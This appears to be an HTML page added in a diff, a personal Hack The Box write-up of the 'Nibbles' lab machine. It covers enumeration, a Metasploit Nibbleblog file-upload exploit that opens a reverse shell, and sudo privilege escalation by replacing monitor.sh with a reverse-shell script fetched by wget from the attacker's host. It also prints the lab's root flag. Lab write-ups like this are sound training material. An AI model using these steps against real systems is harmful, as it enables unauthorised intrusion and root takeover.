@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nibbles - Hack The Box Write-Up</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <nav class="navbar">
+      <ul class="nav-links">
+        <li><a href="index.html"><i class="fas fa-home"></i> Home</a></li>
+        <li><a href="index.html#about"><i class="fas fa-user"></i> About</a></li>
+        <li><a href="projects.html"><i class="fas fa-code"></i> Projects</a></li>
+        <li><a href="writeups.html"><i class="fas fa-file-alt"></i> Write-Ups</a></li>
+        <li><a href="index.html#contact"><i class="fas fa-envelope"></i> Contact</a></li>
+      </ul>
+    </nav>
+
+    <div class="contents">
+      <h1>Nibbles – HackTheBox WriteUp</h1>
+
+      <div class="big-to-normal-image">
+        <img src="../images/nibbles_banner.webp" alt="Nibbles Banner"> <!-- Add your Nibbles banner image here -->
+      </div>
+
+      <p>This write-up focuses on the Hack The Box machine “Nibbles,” which is part of TJnull’s recommended list for OSCP preparation. Nibbles centers on web application vulnerabilities, specifically the exploitation of weaknesses in a custom CMS, and the use of Bash scripting for privilege escalation.</p>
+
+      <h2>Enumeration</h2>
+      <h3>Nmap Scan</h3>
+      <p>I began this machine by running an nmap scan to gather information about the target host. The results revealed only two open ports: 22 and 80, indicating the presence of SSH and a web server. Since there wasn’t much I could do with SSH at this point, I decided to focus my efforts on enumerating the web server.</p>
+
+      <div class="snippet">
+        <pre class="code-block">nmap -A -v 10.129.234.58
+
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-11-05 14:46 CST
+...
+Nmap scan report for 10.129.234.58
+Host is up (0.098s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+...
+Nmap done: 1 IP address (1 host up) scanned in 18.26 seconds</pre>
+      </div>
+
+      <h2>Port 80</h2>
+      <p>Upon visiting the website, I saw that it only displayed a simple “Hello World” message. Suspecting there were additional hidden directories, I proceeded to run an ffuf scan to uncover them.</p>
+
+      <div class="big-to-normal-image">
+        <img src="../images/nibbles_port80.webp" alt="Port 80 webpage">
+      </div>
+
+      <h2>Source Page & /nibbleblog Directory</h2>
+      <p>After the scan finished, I didn’t find any new directories, so I decided to revisit the webpage to see if I had overlooked something. That’s when it hit me — I hadn’t checked the page source yet. Sure enough, in the source code, I found a comment revealing a hidden directory named /nibbleblog/. Navigating to this directory, I was greeted by a blog page.</p>
+
+      <div class="big-to-normal-image">
+        <img src="../images/nibbles_source.webp" alt="Page source comment">
+        <img src="../images/nibbles_blog.webp" alt="Nibbleblog main page">
+      </div>
+
+      <h2>Ffuf Scan</h2>
+      <p>With the /nibbleblog/ directory now revealed, I decided to rerun my ffuf scan, hoping it would uncover additional directories or files of interest. This time, the scan was much more successful, identifying several new directories within /nibbleblog/. Among them was an /admin directory, which immediately caught my attention as a potential entry point for further exploration and possible exploitation.</p>
+
+      <div class="snippet">
+        <pre class="code-block">ffuf -u http://10.129.234.58/nibbleblog/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+
+...
+[Status: 301] admin
+[Status: 301] content
+[Status: 301] plugins
+[Status: 301] themes
+[Status: 301] languages
+...</pre>
+      </div>
+
+      <h2>/Admin Directory & Nikto Scan</h2>
+      <p>After inspecting the admin directory, I hit a wall and couldn’t find anything useful for further exploitation. I decided to run the Nikto web enumeration tool to see if it could uncover additional information. When the scan completed, it revealed several new options, including directories that my ffuf scan had missed and a link to a potential vulnerability in the web server.</p>
+
+      <div class="snippet">
+        <pre class="code-block">nikto -h http://10.129.234.58/
+...
++ /nibbleblog/admin.php: This might be interesting.
++ /nibbleblog/README: README file found.
++ /nibbleblog/install.php: install.php file found.
+...</pre>
+      </div>
+
+      <h2>Admin.php</h2>
+      <p>When I explored the /admin.php directory, I was presented with a login panel. This immediately caught my attention, especially since the Nikto scan had flagged this directory in relation to several CVE vulnerabilities. Given this connection, I suspected that the login panel could be vulnerable.</p>
+
+      <div class="big-to-normal-image">
+        <img src="../images/nibbles_admin_login.webp" alt="Admin login panel">
+      </div>
+
+      <h2>Easy News Version 4.4.1</h2>
+      <p>Upon reviewing the CVE links, I discovered that they pointed to a known vulnerability in Easynews, specifically in the /admin.php directory, which allows for authentication bypass. The issue stems from the fact that this version of Easynews doesn't properly validate whether an administrator has logged in with the correct username and password, effectively allowing unauthorized access. Given that the target host was running Easynews version 4.3, which falls within the range of affected versions, I recognized that this could be a potential attack vector.</p>
+
+      <div class="big-to-normal-image">
+        <img src="../images/nibbles_cve.webp" alt="CVE details">
+      </div>
+
+      <p>When I attempted the exploit on the login panel, it unfortunately failed to work as expected. This setback meant that I needed to rethink my approach and find an alternative route for exploitation.</p>
+
+      <div class="big-to-normal-image">
+        <img src="../images/nibbles_failed_bypass.webp" alt="Failed auth bypass attempt">
+      </div>
+
+      <h2>/README Directory & Nibbleblog Version 4.0.3</h2>
+      <p>After further exploring the directories revealed by the Nikto scan, I stumbled upon some interesting information in the /README directory. It listed the version of Nibbleblog running on the system as 4.0.3. Curious about potential vulnerabilities for this version, I conducted a web search to see if any known exploits existed. My search led me to an Arbitrary File Upload vulnerability in Nibbleblog version 4.0.3, which was available through Metasploit.</p>
+
+      <div class="big-to-normal-image">
+        <img src="../images/nibbles_readme.webp" alt="README showing version 4.0.3">
+      </div>
+
+      <h2>Exploit Success</h2>
+      <p>After setting up Metasploit and configuring the exploit for the Arbitrary File Upload vulnerability in Nibbleblog 4.0.3, I ran the attack using some default Nibbleblog credentials. To my satisfaction, the exploit worked as intended, and I was able to upload a malicious payload to the server. This successfully triggered a reverse shell, granting me access to the target host.</p>
+
+      <div class="snippet">
+        <pre class="code-block">msf6 exploit(multi/http/nibbleblog_file_upload) > exploit
+
+[*] Started reverse TCP handler on 10.10.16.37:4444 
+[*] Sending stage (39927 bytes) to 10.129.234.58
+[+] Deleted image.php
+[*] Meterpreter session 1 opened (10.10.16.37:4444 -> 10.129.234.58:57506)
+
+meterpreter > shell
+ls
+db.xml
+whoami
+nibbler</pre>
+      </div>
+
+      <h2>Privilege Escalation</h2>
+      <p>Now that I had a shell on the target system, my next objective was to escalate my privileges to root. The first step I took was to upgrade the shell to make it more stable and reliable.</p>
+
+      <div class="snippet">
+        <pre class="code-block">which python3
+/usr/bin/python3
+python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>
+      </div>
+
+      <h2>User Flag</h2>
+      <p>Once I had a more stable shell, I took some time to assess the system and understand the environment I was working with. As I explored the directories, I eventually came across the nibbler user’s directory. Inside, I located the user.txt file and successfully retrieved the user flag.</p>
+
+      <div class="snippet">
+        <pre class="code-block">nibbler@Nibbles:/home/nibbler$ ls
+personal.zip  user.txt</pre>
+      </div>
+
+      <h2>Sudo Privileges</h2>
+      <p>After obtaining the user flag, I ran the sudo -l command to check if I had any sudo privileges. To my surprise, I discovered that the nibbler user had permission to run sudo on a specific file named monitor.sh.</p>
+
+      <div class="snippet">
+        <pre class="code-block">sudo -l
+...
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</pre>
+      </div>
+
+      <h2>Monitor.sh</h2>
+      <p>After unzipping the monitor.sh file in the nibbler user directory, I attempted to open it with nano first. Unfortunately, that didn't work, so I tried using vi instead, which successfully opened the file. However, when I tried editing the file with vi, I encountered some issues that made it difficult to work with.</p>
+
+      <div class="snippet">
+        <pre class="code-block">unzip personal.zip
+...
+inflating: personal/stuff/monitor.sh</pre>
+      </div>
+
+      <h2>Reverse Shell</h2>
+      <p>Since I couldn’t properly edit the monitor.sh file, I decided to take a different approach: I would replace it entirely with my own monitor.sh file containing a reverse shell script to escalate my privileges to root. First, I deleted the existing monitor.sh file from the target system. Then, on my local machine, I created a new monitor.sh file and added a bash reverse shell script to it. Next, I set up a Python web server to serve the file, along with a netcat listener to catch the reverse shell. Finally, I used wget on the target system to download the file and replace the original monitor.sh with my crafted version.</p>
+
+      <div class="snippet">
+        <pre class="code-block">rm monitor.sh
+wget http://10.10.16.37/monitor.sh
+chmod +x monitor.sh</pre>
+      </div>
+
+      <h2>Root Shell</h2>
+      <p>Once the new monitor.sh file was uploaded to the web server, I changed its permissions to make it executable and then ran it with sudo. This successfully triggered the reverse shell, and I gained a root shell on the target system. With root access, I navigated to the root directory and retrieved the root flag, completing the exploitation and successfully pwning the machine!</p>
+
+      <div class="snippet">
+        <pre class="code-block">sudo /home/nibbler/personal/stuff/monitor.sh
+
+# whoami
+root
+# cat /root/root.txt
+42f0681e81e735d308e89a827914275e</pre>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
